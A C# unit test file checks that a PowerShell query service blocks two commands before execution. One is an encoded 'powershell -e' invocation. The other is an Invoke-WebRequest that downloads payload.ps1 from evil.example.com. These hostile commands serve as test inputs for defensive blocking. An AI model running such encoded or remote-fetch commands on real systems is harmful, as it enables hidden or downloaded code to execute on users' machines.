using Phantom.Models;
using Phantom.Services;

namespace Phantom.Tests;

public sealed class PowerShellQueryServiceTests
{
    [Fact]
    public async Task InvokeAsync_BlocksEncodedCommandAliasInvocation_BeforeExecution()
    {
        var paths = TestHelpers.CreateIsolatedPaths();
        var settings = new AppSettings();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var query = new PowerShellQueryService(console, log);

        var result = await query.InvokeAsync(
            "powershell -e SQBFAFgAIAAnAGMAYQBsAGMALgBlAHgAZQAnAA==",
            CancellationToken.None,
            echoToConsole: false);

        Assert.Equal(1, result.ExitCode);
        Assert.Contains("Blocked PowerShell query script", result.Stderr, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("encoded command", result.Stderr, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task InvokeAsync_BlocksUntrustedDownloadHost_BeforeExecution()
    {
        var paths = TestHelpers.CreateIsolatedPaths();
        var settings = new AppSettings();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var query = new PowerShellQueryService(console, log);

        var result = await query.InvokeAsync(
            "Invoke-WebRequest -Uri 'https://evil.example.com/payload.ps1' -OutFile \"$env:TEMP\\\\payload.ps1\"",
            CancellationToken.None,
            echoToConsole: false);

        Assert.Equal(1, result.ExitCode);
        Assert.Contains("Blocked PowerShell query script", result.Stderr, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("Blocked download host", result.Stderr, StringComparison.OrdinalIgnoreCase);
    }
}
